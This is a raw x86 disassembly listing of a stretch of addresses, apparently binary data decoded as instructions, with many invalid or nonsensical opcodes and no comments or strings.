  424383:	sub    DWORD PTR [eax-0x74],edx
  424386:	sbb    ecx,DWORD PTR [edi-0x118a43e7]
  42438c:	sub    eax,0xdaf554
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x424381
  424401:	mov    ds:0x829439e4,al
  424406:	add    DWORD PTR [eax],eax
  424408:	add    al,0x1
  42440a:	add    BYTE PTR [eax],al
  42440c:	out    dx,al
  42440d:	sti    
  42440e:	cmp    dl,BYTE PTR [eax+0x7a]
  424411:	jb     0x4243e0
  424413:	xchg   ebp,eax
  424414:	adc    al,0x7c
  424416:	and    BYTE PTR [eax-0x4838e1d3],ah
  42441c:	cmp    esp,esi
  42441e:	jae    0x4243ca
  424420:	dec    esp
  424421:	cmp    al,0x39
  424423:	xlat   BYTE PTR ds:[ebx]
  424424:	pop    esi
  424425:	push   es
  424426:	int    0x63
  424428:	xchg   edx,eax
  424429:	and    DWORD PTR [ebp-0x1b],0x5d
  42442d:	ficom  WORD PTR [ebx+0x4a49b7aa]
  424433:	call   0x42263da5
  424438:	adc    BYTE PTR [esi+edi*2+0x1b],bl
  42443c:	mov    eax,esi
  42443e:	mov    esi,0x22e03268
  424443:	bndldx bnd2,[ebx-0x6b]
  424447:	ret    
  424448:	pop    ecx
  424449:	and    ebp,eax
  42444b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42444c:	ja     0x424438
  42444e:	xor    DWORD PTR [esi],edi
  424450:	jmp    0x7540:0x4c1fd7a9
  424457:	sbb    BYTE PTR [eax-0x31799402],dl
  42445d:	mov    ebp,0x65bfddf0
  424462:	push   edi
  424463:	cld    
  424464:	jmp    0x1172:0xe75efe3b
  42446b:	xor    eax,0x3f87bc3b
  424470:	push   cs
  424471:	xlat   BYTE PTR ds:[ebx]
  424472:	dec    esp
  424473:	cmc    
  424474:	rcr    BYTE PTR [ecx],cl
  424476:	xchg   esi,eax
  424477:	pop    ebx
  424478:	jp     0x4244c2
  42447a:	adc    edx,DWORD PTR [edx]
  42447c:	lahf   
  42447d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42447e:	es sti 
  424480:	int    0xe9
  424482:	add    DWORD PTR [ebx+0x6e00a884],edi
  424488:	mov    ebp,0xf4a10c4e
  42448d:	neg    DWORD PTR [ecx+esi*2]
  424490:	leave  
  424491:	dec    esp
  424492:	add    DWORD PTR [ebx],ebx
  424494:	or     dl,ch
  424496:	test   DWORD PTR [esi+esi*4],eax
  424499:	xchg   ebp,eax
  42449a:	cs mov ebx,0x2930417b
  4244a0:	xchg   ebx,eax
  4244a1:	xor    al,ah
  4244a3:	mov    dh,dh
  4244a5:	mov    ah,0x2a
  4244a7:	enter  0xb41e,0xe5
  4244ab:	aad    0x69
  4244ad:	int3   
  4244ae:	dec    edx
  4244af:	dec    edx
  4244b0:	pop    esp
  4244b1:	into   
  4244b2:	jno    0x424467
  4244b4:	mov    bl,0xf7
  4244b6:	ror    BYTE PTR [edi-0x2c7ff69e],1
  4244bc:	mov    ebx,?
  4244be:	dec    esp
  4244bf:	mov    ecx,0xd453fbd7
  4244c4:	inc    edx
  4244c5:	mov    cl,0xc9
  4244c7:	or     al,0x9e
  4244c9:	repnz imul edi,DWORD PTR [eax-0x76],0xffffffc2
  4244ce:	or     eax,esp
  4244d0:	int3   
  4244d1:	shr    BYTE PTR [ebx-0x5ccb664c],cl
  4244d7:	push   es
  4244d8:	xchg   ecx,eax
  4244d9:	xor    dh,al
  4244db:	fldcw  WORD PTR [esi+0x1c]
  4244de:	jo     0x424462
  4244e0:	(bad)  
  4244e1:	xor    BYTE PTR [edi+0x45fc68a6],ah
  4244e7:	push   0x40bc0582
  4244ec:	inc    edx
  4244ed:	es mov ah,0x16
  4244f0:	sub    edx,DWORD PTR [edx-0x77ed19ba]
  4244f6:	into   
  4244f7:	int    0x2d
  4244f9:	push   ds
  4244fa:	push   cs
  4244fb:	test   al,0xa1
  4244fd:	mov    bh,0x88
  4244ff:	in     eax,0x73
  424501:	sub    ebp,DWORD PTR [esi]
  424503:	imul   DWORD PTR [eax+0x43dfe780]
  424509:	sub    eax,0x10493468
  42450e:	std    
  42450f:	adc    eax,0x0
	...
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x33],1
  424581:	pop    ss
  424582:	lahf   
  424583:	sub    ebx,DWORD PTR [eax+0x4000183]
  424589:	add    DWORD PTR [eax],eax
  42458b:	add    BYTE PTR [ecx],ah
  42458d:	sub    BYTE PTR [eax],ch
  42458f:	inc    esi
  424590:	mov    esp,0xf6f56832
  424595:	mov    ecx,0x9a3297d1
  42459a:	scas   al,BYTE PTR es:[edi]
  42459b:	ds sub eax,0x3d735faa
  4245a1:	imul   esi,DWORD PTR [esi-0x7b64526f],0xfffffff5
  4245a8:	sbb    DWORD PTR [edi],esi
  4245aa:	add    DWORD PTR [ecx],eax
  4245ac:	ins    DWORD PTR es:[edi],dx
  4245ad:	fucom  st(7)
  4245af:	ja     0x4245b9
  4245b1:	mov    dh,0x5d
  4245b3:	mov    bl,0xd3
  4245b5:	fst    QWORD PTR [ebp-0x4df7ddb1]
  4245bb:	pushf  
  4245bc:	mov    bl,0xec
  4245be:	lods   al,BYTE PTR ds:[esi]
  4245bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245c0:	jmp    0x4245cb
  4245c2:	cmp    eax,0x2e98252f
  4245c7:	or     al,0x2d
  4245c9:	test   DWORD PTR [ecx+ecx*4],eax
  4245cc:	outs   dx,DWORD PTR ds:[esi]
  4245cd:	xchg   esp,eax
  4245ce:	pop    ds
  4245cf:	sub    dl,BYTE PTR [ebx-0x5fc53731]
  4245d5:	das    
  4245d6:	and    esi,esp
  4245d8:	mov    dl,0x6a
  4245da:	scas   eax,DWORD PTR es:[edi]
  4245db:	call   0xf083:0xe52ab349
  4245e2:	mov    WORD PTR [ecx],?
  4245e4:	adc    eax,0xeaa3484e
  4245e9:	xor    al,0x45
  4245eb:	test   DWORD PTR [edi+ebx*2+0x2e],eax
  4245ef:	adc    al,BYTE PTR [ebx]
  4245f1:	cwde   
  4245f2:	je     0x424581
  4245f4:	icebp  
  4245f5:	and    eax,0x564fef0d
  4245fa:	jne    0x42458f
  4245fc:	mov    ds:0xda39abda,al
  424601:	cmp    eax,DWORD PTR [eax-0x21]
  424604:	jecxz  0x4245c4
  424606:	jle    0x424613
  424608:	cmp    edx,eax
  42460a:	(bad)  
  42460b:	pop    ebp
  42460c:	js     0x4245ad
  42460e:	or     al,0x2b
  424610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424611:	es jle 0x4245a8
  424614:	les    ebx,FWORD PTR [ebp+0x6a1e5755]
  42461a:	pop    eax
  42461b:	push   ecx
  42461c:	adc    al,al
  42461e:	xlat   BYTE PTR ds:[ebx]
  42461f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424620:	jl     0x424611
  424622:	(bad)  
  424623:	call   0xcacb60a8
  424628:	mov    ch,0x4e
  42462a:	in     al,0x2
  42462c:	mov    cl,BYTE PTR [bp+si]
  42462f:	popa   
  424630:	(bad)  
  424631:	cmp    ecx,edi
  424633:	enter  0x1e3b,0xa9
  424637:	fnstcw WORD PTR fs:[eax-0x3e29fa88]
  42463e:	or     DWORD PTR [ecx+0x37],ebx
  424641:	je     0x42465a
  424643:	mov    ebp,DWORD PTR [ebx]
  424645:	pop    esp
  424646:	(bad)  
  424647:	push   edx
  424648:	push   esp
  424649:	pop    esp
  42464a:	in     eax,0x2c
  42464c:	fs cmp eax,0x7f5ccdc
  424652:	adc    ah,bh
  424654:	sub    edi,esp
  424656:	cmp    DWORD PTR [ebx+0x3d],0x5a
  42465a:	ja     0x42465a
  42465c:	inc    esp
  42465d:	push   0xffffffbf
  42465f:	inc    esi
  424660:	sahf   
  424661:	pop    edi
  424662:	inc    ebx
  424663:	push   ecx
  424664:	lahf   
  424665:	in     eax,dx
  424666:	and    al,0x5c
  424668:	shr    ah,0x6
  42466b:	mov    edx,0xd726ea15
  424670:	mov    esp,0x2d8f947e
  424675:	add    cl,bh
  424677:	sahf   
  424678:	mov    eax,0x1e8d799f
  42467d:	sub    eax,0x8f2bdfb3
  424682:	mov    cl,ah
  424684:	cmp    eax,0xace46d90
  424689:	mov    cl,BYTE PTR [esi-0x7f]
  42468c:	imul   edx,DWORD PTR [ecx+0xd399],0x0
	...
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [edi],cl
  424701:	mov    edx,0x849c6540
  424706:	add    DWORD PTR [eax],eax
  424708:	add    al,0x1
  42470a:	add    BYTE PTR [eax],al
  42470c:	xchg   edi,eax
  42470d:	fs and bh,bh
  424710:	cmp    DWORD PTR [esp+edx*1+0x27e9f238],esi
  424717:	dec    esi
  424718:	add    al,0x5e
  42471a:	sti    
  42471b:	mov    esi,0xcc29830d
  424720:	push   ds
  424721:	dec    ebx
  424722:	loop   0x424702
  424724:	adc    edi,DWORD PTR [ebp+ebp*2-0x57]
  424728:	pop    es
  424729:	std    
  42472a:	jno    0x424770
  42472c:	mov    bh,0xa4
  42472e:	fidivr DWORD PTR [ebx]
  424730:	sbb    BYTE PTR [ecx-0xc],dh
  424733:	sbb    ah,BYTE PTR [ecx]
  424735:	(bad)  
  424736:	xor    DWORD PTR [ebx-0x7b739cf],esp
  42473c:	fadd   QWORD PTR [edi-0xd07baa1]
  424742:	mov    edi,0xdf95be24
  424747:	or     eax,0x1ba7f959
  42474c:	and    BYTE PTR [esi-0x197deb4c],ah
  424752:	inc    edi
  424753:	scas   al,BYTE PTR es:[edi]
  424754:	test   DWORD PTR [edi+0xa],ecx
  424757:	stos   BYTE PTR es:[edi],al
  424758:	mov    ds:0x9e756f28,eax
  42475d:	push   edx
  42475e:	xor    al,0xb9
  424760:	adc    dl,ch
  424762:	mov    dl,0x72
  424764:	out    0x5d,eax
  424766:	cmc    
  424767:	dec    edx
  424768:	fisttp WORD PTR [ebx]
  42476a:	pop    edi
  42476b:	mov    DWORD PTR [edx+ebp*4+0x77e922d1],esi
  424772:	dec    ecx
  424773:	lds    ebx,FWORD PTR [ebx]
  424775:	mov    DWORD PTR [ecx-0x7df78439],edi
  42477b:	or     al,0xc8
  42477d:	and    ah,al
  42477f:	xchg   edx,eax
  424780:	repz add DWORD PTR [eax-0x80],0xfffffff0
  424785:	lahf   
  424786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424787:	out    dx,al
  424788:	fimul  WORD PTR [ecx-0x57]
  42478b:	and    edi,ebx
  42478d:	loope  0x4247ee
  42478f:	pop    ebx
  424790:	rcl    DWORD PTR [edi-0x77],1
  424793:	int    0x69
  424795:	mov    BYTE PTR [ecx],ch
  424797:	jnp    0x4247da
  424799:	cmp    eax,0xfc4e070
  42479e:	leave  
  42479f:	xor    eax,0x7924e2ae
  4247a4:	(bad)  
  4247a5:	ror    BYTE PTR [edi],0xf0
  4247a8:	cmp    eax,esp
  4247aa:	mov    ah,0x83
  4247ac:	aam    0xa8
  4247ae:	dec    edi
  4247af:	pop    ds
  4247b0:	scas   eax,DWORD PTR es:[edi]
  4247b1:	addr16 mov ebp,0x50335b6b
  4247b7:	outs   dx,DWORD PTR ds:[esi]
  4247b8:	dec    ebp
  4247b9:	add    ebp,ecx
  4247bb:	loope  0x424799
  4247bd:	mov    ebx,0x5c81a885
  4247c2:	push   ds
  4247c3:	and    BYTE PTR [eax-0x23b52308],0x53
  4247ca:	je     0x4247cf
  4247cc:	popa   
  4247cd:	cmp    eax,DWORD PTR [ecx]
  4247cf:	mov    ebx,0xa3e38474
  4247d4:	push   edx
  4247d5:	mov    edi,0xf387643d
  4247da:	or     edi,DWORD PTR ds:0x9fc72d2
  4247e0:	adc    ah,BYTE PTR [edx]
  4247e2:	cmp    DWORD PTR [ecx+0x30],0xffffffce
  4247e6:	pop    ebx
  4247e7:	ins    BYTE PTR es:[edi],dx
  4247e8:	(bad)  
  4247e9:	pop    ebp
  4247ea:	js     0x42484c
  4247ec:	test   ecx,0xfcd4c5d3
  4247f2:	outs   dx,BYTE PTR ds:[esi]
  4247f3:	mov    ch,0x6a
  4247f5:	dec    ebp
  4247f6:	jns    0x42481c
  4247f8:	icebp  
  4247f9:	push   edx
  4247fa:	call   0x9c64:0x6cfd1ca3
  424801:	pop    edi
  424802:	jle    0x4247c4
  424804:	shr    dh,1
  424806:	mov    eax,0x22391725
  42480b:	fwait
  42480c:	mov    al,0xb9
  42480e:	xchg   esi,eax
  42480f:	dec    eax
	...
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	push   ebp
  424881:	popf   
  424882:	call   0x400:0x185a082
  424889:	add    DWORD PTR [eax],eax
  42488b:	add    BYTE PTR [eax+edi*8-0x554c7ee9],bl
  424892:	pop    ebx
  424893:	mov    bl,BYTE PTR [ecx-0xa4717f8]
  424899:	cmp    al,0x8e
  42489b:	dec    ebx
  42489c:	inc    esi
  42489d:	mov    fs,WORD PTR [edx]
  42489f:	jbe    0x4248f9
  4248a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248a2:	dec    edi
  4248a3:	lds    esp,FWORD PTR [ebp+ebp*4-0x311fc4d9]
  4248aa:	inc    esp
  4248ab:	or     cl,BYTE PTR [ebp+edi*1-0x795b3b97]
  4248b2:	and    ebx,edi
  4248b4:	pop    eax
  4248b5:	cli    
  4248b6:	dec    esi
  4248b7:	lock popa 
  4248b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248ba:	int    0xa8
  4248bc:	shl    BYTE PTR ds:0x720f19c2,0x3f
  4248c3:	sbb    bl,BYTE PTR [ebp+0x12b012db]
  4248c9:	dec    edx
  4248ca:	mov    dl,0x2
  4248cc:	xor    dl,BYTE PTR [ebx-0xb]
  4248cf:	nop
  4248d0:	adc    ebx,DWORD PTR [edi+edi*4+0x6074a72c]
  4248d7:	(bad)  
  4248d9:	test   BYTE PTR [esi-0x3],al
  4248dc:	sub    al,0x7c
  4248de:	add    al,0x7b
  4248e0:	enter  0x834f,0x94
  4248e4:	inc    esp
  4248e5:	push   edi
  4248e6:	pop    es
  4248e7:	js     0x42486c
  4248e9:	ja     0x4248a4
  4248eb:	and    dl,al
  4248ed:	repnz dec edx
  4248ef:	jno    0x4248a3
  4248f1:	repz mov edx,0x8a7d69dd
  4248f7:	pop    esp
  4248f8:	dec    edi
  4248f9:	ja     0x424952
  4248fb:	xchg   esp,eax
  4248fc:	mov    bh,0xdf
  4248fe:	xchg   ecx,eax
  4248ff:	dec    ebp
  424900:	fsub   QWORD PTR [esi]
  424902:	cli    
  424903:	jnp    0x4248d0
  424905:	scas   eax,DWORD PTR es:[edi]
  424906:	sub    ecx,edx
  424908:	(bad)  
  424909:	jns    0x4248f4
  42490b:	add    bh,bl
  42490d:	and    al,BYTE PTR [edx-0x2b952c45]
  424913:	(bad)  
  424915:	cmp    eax,0x46630cda
  42491a:	inc    edx
  42491b:	add    BYTE PTR [ecx+0x619bf018],dl
  424921:	fstp   st(5)
  424923:	pop    esp
  424924:	mov    ch,0x14
  424926:	jno    0x4248d5
  424928:	xchg   ecx,eax
  424929:	mov    al,0x17
  42492b:	jae    0x424942
  42492d:	add    ah,BYTE PTR [esi]
  42492f:	add    dl,dl
  424931:	daa    
  424932:	xor    DWORD PTR [ebx*8+0x7e59044e],edx
  424939:	(bad)  
  42493b:	arpl   WORD PTR [ecx+0x12816742],dx
  424941:	sbb    al,0xf4
  424943:	fiadd  DWORD PTR [esp+edx*4-0x6f6e8348]
  42494a:	dec    eax
  42494b:	fcmovb st,st(6)
  42494d:	aad    0xe
  42494f:	and    eax,0x121e0e7d
  424954:	sub    ebp,ebx
  424956:	and    ebx,DWORD PTR [edx-0x13925e9e]
  42495c:	daa    
  42495d:	mov    al,0xbe
  42495f:	sub    esp,eax
  424961:	gs cmp eax,ebx
  424964:	and    DWORD PTR [esi+eiz*2-0x1b757167],ebp
  42496b:	xor    al,0x64
  42496d:	cmc    
  42496e:	jmp    0xc36f:0x406a377a
  424975:	jge    0x4249a4
  424977:	(bad)  
  424978:	daa    
  424979:	ss out 0xc6,eax
  42497c:	test   eax,0xd2dcef31
  424981:	mov    al,ds:0x5086e883
  424986:	shl    BYTE PTR [ebp-0x35],0x24
  42498a:	pop    es
  42498b:	lds    ebx,FWORD PTR [ebx]
  42498d:	mov    dl,0x50
  42498f:	add    BYTE PTR [eax],0x0
	...
  4249f2:	add    BYTE PTR [eax],al
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    cl,BYTE PTR [ebx]
  424a01:	iret   
  424a02:	and    DWORD PTR [ecx+0x186a4],ebx
  424a08:	add    al,0x1
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	cmp    al,al
  424a0e:	jge    0x424a52
  424a10:	lock das 
  424a12:	arpl   WORD PTR [ebx-0x7],bx
  424a15:	cmp    DWORD PTR ds:0xbd521fa6,esi
  424a1b:	sbb    eax,0x97227c4c
  424a20:	add    cl,BYTE PTR [ecx]
  424a22:	inc    edx
  424a23:	push   cs
  424a24:	sub    al,0x4e
  424a26:	mov    edi,DWORD PTR [eax+ebx*8-0x61]
  424a2a:	sub    edx,eax
  424a2c:	jecxz  0x424a74
  424a2e:	fisubr DWORD PTR [edx-0x7d]
  424a31:	inc    esi
  424a32:	call   0xd50d1a86
  424a37:	mov    cs,WORD PTR [edx-0xf37f6aa]
  424a3d:	pop    esp
  424a3e:	mov    ah,0x22
  424a40:	js     0x424a39
  424a42:	cmc    
  424a43:	shr    DWORD PTR [edx+0xbccdfe],cl
  424a49:	(bad)  
  424a4d:	mov    ebp,0x38c16928
  424a52:	and    eax,0xc88b372
  424a57:	ins    BYTE PTR es:[edi],dx
  424a58:	and    al,0xcf
  424a5a:	dec    esi
  424a5b:	or     BYTE PTR [edx+ebp*8],ah
  424a5e:	leave  
  424a5f:	int3   
  424a60:	mov    bh,0x6f
  424a62:	call   0xca07:0xb49ade69
  424a69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a6a:	or     bl,BYTE PTR [edx-0xee9a64e]
  424a70:	xor    DWORD PTR [ebx+eiz*4+0x59d830ec],esp
  424a77:	call   FWORD PTR [ebx]
  424a79:	call   0x6d13:0x310a38d7
  424a80:	xor    al,0xde
  424a82:	jbe    0x424aa5
  424a84:	dec    eax
  424a85:	or     al,0x67
  424a87:	push   esp
  424a88:	and    ah,BYTE PTR [esi+0x19d5df53]
  424a8e:	push   esp
  424a8f:	(bad)  
  424a90:	ds shl ebx,cl
  424a93:	popa   
  424a94:	fist   DWORD PTR [ecx+0x58cfc63f]
  424a9a:	and    al,BYTE PTR [edi-0x6d1183b0]
  424aa0:	mov    bh,0x9d
  424aa2:	or     BYTE PTR [esp+eiz*2-0x52f6752],bh
  424aa9:	out    0x5d,al
  424aab:	pusha  
  424aac:	mov    WORD PTR [ebx-0x367e2b88],ss
  424ab2:	sbb    al,0xca
  424ab4:	mov    ds:0xfe3067ba,eax
  424ab9:	repz fimul DWORD PTR [edi]
  424abc:	cli    
  424abd:	hlt    
  424abe:	aam    0xbf
  424ac0:	pop    ebx
  424ac1:	mov    esp,?
  424ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ac4:	jae    0x424a93
  424ac6:	test   al,0xb0
  424ac8:	or     edi,esi
  424aca:	sbb    BYTE PTR [ebp-0x1b26968b],dh
  424ad0:	pop    edi
  424ad1:	ss je  0x424ace
  424ad4:	pop    ebp
  424ad5:	xor    ecx,edi
  424ad7:	(bad)  
  424ad8:	mov    ?,WORD PTR [ebx]
  424ada:	idiv   BYTE PTR [ecx-0x28]
  424add:	popa   
  424ade:	icebp  
  424adf:	mov    cl,0x82
  424ae1:	js     0x424ac6
  424ae3:	scas   al,BYTE PTR es:[edi]
  424ae4:	xor    bl,BYTE PTR [eax+0x188a6c6a]
  424aea:	sti    
  424aeb:	xchg   di,ax
  424aed:	xchg   edi,eax
  424aee:	add    cl,BYTE PTR [esi]
  424af0:	push   cs
  424af1:	or     esi,DWORD PTR [eax-0x6]
  424af4:	adc    edx,DWORD PTR [ecx+0x52b5727d]
  424afa:	dec    esi
  424afb:	loop   0x424b6b
  424afd:	ja     0x424ac8
  424aff:	mov    eax,ecx
  424b01:	and    DWORD PTR [eax-0x73],0xffffffdc
  424b05:	push   ebp
  424b06:	inc    ebx
  424b07:	pop    edx
  424b08:	fdiv   st,st(6)
  424b0a:	out    dx,al
  424b0b:	data16 sub al,0x68
  424b0e:	ins    DWORD PTR es:[edi],dx
  424b0f:	cmp    al,0x0
	...
  424b71:	add    BYTE PTR [eax],al
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	add    DWORD PTR [edi+0x3d],edx
  424b83:	and    eax,0x187a8
  424b88:	add    al,0x1
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	mov    cl,0x87
  424b8e:	cmp    al,0x19
  424b90:	jmp    0x50f414af
  424b95:	xchg   ebx,eax
  424b96:	add    bl,ch
  424b98:	fst    QWORD PTR [ebx]
  424b9a:	mov    WORD PTR [eax-0x49],ss
  424b9d:	sub    bh,BYTE PTR [edi]
  424b9f:	mov    eax,0xeaab93cf
  424ba4:	push   edx
  424ba5:	inc    ebp
  424ba6:	mov    cs,esi
  424ba8:	popf   
  424ba9:	push   esi
  424baa:	dec    edx
  424bab:	icebp  
  424bac:	fdivr  st(1),st
  424bae:	test   al,0x90
  424bb0:	xor    ebp,DWORD PTR [eax+0x22ed448d]
  424bb6:	test   BYTE PTR [ecx],bh
  424bb8:	pushf  
  424bb9:	inc    ebp
  424bba:	ds dec esp
  424bbc:	call   0x4c84:0x5e201902
  424bc3:	cmp    eax,0x40d14900
  424bc8:	arpl   WORD PTR [ecx-0x1e],bx
  424bcb:	or     al,BYTE PTR [ecx+0x75]
  424bce:	push   esi
  424bcf:	mov    BYTE PTR [ecx-0x4721a684],bh
  424bd5:	pop    es
  424bd6:	aaa    
  424bd7:	outs   dx,BYTE PTR ds:[esi]
  424bd8:	in     al,0x3c
  424bda:	inc    edx
  424bdb:	loope  0x424c36
  424bdd:	das    
  424bde:	xchg   edx,eax
  424bdf:	dec    esi
  424be0:	mov    DWORD PTR [esi+0x5848d756],eax
  424be6:	xchg   BYTE PTR [edi],bh
  424be8:	adc    eax,0x48e4e711
  424bed:	push   esp
  424bee:	neg    DWORD PTR [ecx]
  424bf0:	xor    DWORD PTR [ebx],esp
  424bf2:	cmp    eax,0x28c98c68
  424bf7:	sbb    ecx,DWORD PTR [ecx]
  424bf9:	dec    ebx
  424bfa:	sub    BYTE PTR ds:0x736a5fda,dl
  424c00:	sbb    DWORD PTR [ecx+0x4f95235d],esp
  424c06:	mov    ebx,0x647f56e5
  424c0b:	mov    ds:0xdcbd121e,al
  424c10:	adc    al,bl
  424c12:	mov    dh,0x94
  424c14:	imul   eax,DWORD PTR ds:[ebp-0x2e],0x79
  424c19:	mov    WORD PTR [ecx+0x4f],fs
  424c1c:	adc    DWORD PTR [esi-0x20],ecx
  424c1f:	adc    DWORD PTR [eax+0x31],edx
  424c22:	sbb    DWORD PTR ds:0x7133f3f7,esp
  424c28:	inc    ebp
  424c29:	fs (bad) 
  424c2b:	mov    ah,0x1e
  424c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c2e:	mov    dh,0x37
  424c30:	adc    esi,esi
  424c32:	ror    BYTE PTR [edx-0x5444457d],cl
  424c38:	in     al,0xc0
  424c3a:	or     ebx,DWORD PTR [ecx]
  424c3c:	leave  
  424c3d:	xchg   ecx,eax
  424c3e:	mov    cl,0x6f
  424c40:	mov    edi,0xbe9c1c8
  424c45:	ins    DWORD PTR es:[edi],dx
  424c46:	mov    BYTE PTR [eax-0x2b],cl
  424c49:	push   es
  424c4a:	jo     0x424c5f
  424c4c:	out    dx,al
  424c4d:	mov    esi,0xd42a59af
  424c52:	dec    ebx
  424c53:	hlt    
  424c54:	push   esp
  424c55:	pop    esi
  424c56:	sbb    BYTE PTR [edi],al
  424c58:	dec    esp
  424c59:	enter  0x3f94,0x9b
  424c5d:	sbb    edx,ecx
  424c5f:	cmp    DWORD PTR [eax],edx
  424c61:	mov    ebp,0x14fdd8a4
  424c66:	jnp    0x424c98
  424c68:	or     eax,0x9e06b495
  424c6d:	mov    al,0x7a
  424c6f:	xchg   DWORD PTR [eax],edx
  424c71:	mov    DWORD PTR [ebx+0x7946cafd],esi
  424c77:	ret    0x20a4
  424c7a:	inc    esp
  424c7b:	mov    ds:0x87fd2c4f,al
  424c80:	int3   
  424c81:	retf   0x8719
  424c84:	mov    esp,0x611c7e92
  424c89:	ja     0x424c70
  424c8b:	adc    BYTE PTR [ebx+0x3fb531],ah
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	call   0xac774f35
  424d05:	mov    BYTE PTR [ecx],al
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	mov    dh,BYTE PTR [edi+0x268ab13e]
  424d12:	mov    BYTE PTR [ebx+0x2092e474],dh
  424d18:	in     eax,dx
  424d19:	pop    esp
  424d1a:	and    al,0x12
  424d1c:	cwde   
  424d1d:	mov    eax,ds:0x6d682682
  424d22:	push   0x99909b3
  424d27:	jecxz  0x424d18
  424d29:	inc    ebp
  424d2a:	pop    esi
  424d2b:	sbb    eax,0xd990cde3
  424d30:	ficomp DWORD PTR [esi]
  424d32:	sbb    bl,BYTE PTR [ecx]
  424d34:	adc    DWORD PTR [ebx],ebp
  424d36:	xor    bh,BYTE PTR [ecx]
  424d38:	and    bl,BYTE PTR [ebx+0x7b]
  424d3b:	popf   
  424d3c:	fnstsw WORD PTR [ecx]
  424d3e:	test   eax,0x9e443ff3
  424d43:	dec    eax
  424d44:	out    0xfa,eax
  424d46:	test   al,0xb4
  424d48:	mov    ebx,0x189ef18e
  424d4d:	inc    eax
  424d4e:	mov    esp,0x5917fea3
  424d53:	fdiv   st(6),st
  424d55:	push   eax
  424d56:	jle    0x424da5
  424d58:	cmp    edx,ecx
  424d5a:	jl     0x424d12
  424d5c:	into   
  424d5d:	lods   al,BYTE PTR ds:[esi]
  424d5e:	inc    eax
  424d5f:	or     bl,dh
  424d61:	ret    0xe7cf
  424d64:	cmp    al,0x9e
  424d66:	push   ebp
  424d67:	ins    DWORD PTR es:[edi],dx
  424d68:	push   ebp
  424d69:	or     ch,BYTE PTR [edi+ebp*1]
  424d6c:	loop   0x424db9
  424d6e:	sti    
  424d6f:	jl     0x424d74
  424d71:	jo     0x424cf3
  424d73:	or     DWORD PTR [esi+0xe83820b],0x31
  424d7a:	xchg   ecx,eax
  424d7b:	xor    eax,eax
  424d7d:	inc    edx
  424d7e:	cmp    al,0xa1
  424d80:	pop    ecx
  424d81:	push   edx
  424d82:	adc    al,0xec
  424d84:	aad    0xa4
  424d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d87:	and    DWORD PTR [ecx+0x65],ebp
  424d8a:	xor    BYTE PTR ds:0x890d0c74,bl
  424d90:	repnz sub bl,BYTE PTR [eax]
  424d93:	or     DWORD PTR [edi],esi
  424d95:	js     0x424db4
  424d97:	repnz and esp,ebp
  424d9a:	fisub  WORD PTR [edi+0x57]
  424d9d:	add    bl,ah
  424d9f:	nop
  424da0:	lahf   
  424da1:	xchg   BYTE PTR [edi],ah
  424da3:	sub    eax,0x2f1c525d
  424da8:	popf   
  424da9:	sar    BYTE PTR [ecx],0x25
  424dac:	shl    dh,cl
  424dae:	addr16 mov bh,0x1e
  424db1:	pop    DWORD PTR [ecx]
  424db3:	xor    al,0xe4
  424db5:	fwait
  424db6:	adc    DWORD PTR [edi+0x41],esi
  424db9:	int    0xd5
  424dbb:	mov    eax,ds:0xb6fbca0
  424dc0:	sub    dh,bh
  424dc2:	pop    edx
  424dc3:	pop    ss
  424dc4:	or     al,0x3
  424dc6:	aam    0xb3
  424dc8:	cmc    
  424dc9:	cmp    BYTE PTR [esi+0x9e482fd],ah
  424dcf:	mov    bh,0x38
  424dd1:	xor    al,0x25
  424dd3:	(bad)  
  424dd4:	rcr    BYTE PTR [edx+0x3a],1
  424dd7:	inc    ecx
  424dd8:	xchg   ebx,eax
  424dd9:	pop    edx
  424dda:	mov    bl,0xa8
  424ddc:	addr16 cli 
  424dde:	xor    al,0x5f
  424de0:	mov    edi,0x7ba6a967
  424de5:	pusha  
  424de6:	fstp   QWORD PTR [ebx+0x5b7b31d]
  424dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ded:	sub    dh,BYTE PTR [esi]
  424def:	jge    0x424d9b
  424df1:	jae    0x424db4
